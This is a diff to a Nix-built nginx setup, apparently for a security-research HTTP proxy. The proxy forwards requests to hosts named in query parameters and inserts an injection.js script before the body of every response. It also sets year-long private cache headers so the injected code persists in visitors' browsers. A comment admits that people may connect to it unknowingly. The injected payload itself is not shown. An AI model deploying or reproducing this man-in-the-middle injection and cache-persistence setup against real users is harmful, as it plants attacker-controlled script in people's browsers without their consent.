@@ -71,10 +71,18 @@ let
     ''}
   '';
 
+  message = pkgs.writeText "message.js" ''
+    // If you see this, you are connected to (or have recently connected to) an HTTP proxy server that is being used for security research, and is not meant for the public. If this is a mistake, clear your browser cache, and everything will be alright.
+  '';
+
   injection = pkgs.stdenv.mkDerivation {
     name = "injection.js";
     builder = pkgs.writeText "builder.sh" ''
-      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${injectionRaw} > $out
+      . $stdenv/setup
+      touch $out
+      cat ${message} >> $out
+      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${injectionRaw} >> $out
+      echo >> $out
     '';
   };
 
@@ -110,51 +118,48 @@ in {
           nginxModules.echo nginxModules.develkit nginxModules.lua
         ];
       };
-    config = ''
-      events {
-        worker_connections 1024;
+    eventsConfig = ''
+      worker_connections 1024;
+    '';
+    appendHttpConfig = ''
+      resolver 8.8.8.8;
+      resolver_timeout 5s;
+
+      server {
+        listen *:80;
+        root ${./homepage};
       }
 
-      http {
-        resolver 8.8.8.8;
-        resolver_timeout 5s;
+      server {
+        listen 127.0.0.1:13337;
 
-        server {
-          listen *:80;
-          root ${./homepage};
+        location /injection.js {
+          alias ${injection};
         }
 
-        server {
-          listen 127.0.0.1:13337;
+        location / {
 
-          location /injection.js {
-            alias ${injection};
+          set_by_lua_block $proxy_host {
+            return ngx.unescape_uri(ngx.var.arg_host)
+          }
+          set_by_lua_block $proxy_url {
+            return ngx.unescape_uri(ngx.var.arg_url)
           }
 
-          location / {
+          proxy_redirect off;
+          proxy_set_header Accept-Encoding "";
+          proxy_set_header Host $proxy_host;
+          proxy_set_header X-Forwarded-Host $proxy_host;
+          proxy_pass "$proxy_url";
 
-            set_by_lua_block $proxy_host {
-              return ngx.unescape_uri(ngx.var.arg_host)
-            }
-            set_by_lua_block $proxy_url {
-              return ngx.unescape_uri(ngx.var.arg_url)
-            }
+          expires max;
+          add_header Pragma "private";
+          add_header Cache-Control "private,max-age=31535990";
+          add_header ETag "";
 
-            proxy_redirect off;
-            proxy_set_header Accept-Encoding "";
-            proxy_set_header Host $proxy_host;
-            proxy_set_header X-Forwarded-Host $proxy_host;
-            proxy_pass "$proxy_url";
+          add_before_body /injection.js;
+          addition_types *;
 
-            expires max;
-            add_header Pragma "private";
-            add_header Cache-Control "private,max-age=31535990";
-            add_header ETag "";
-
-            add_before_body /injection.js;
-            addition_types *;
-
-          }
         }
       }
     '';
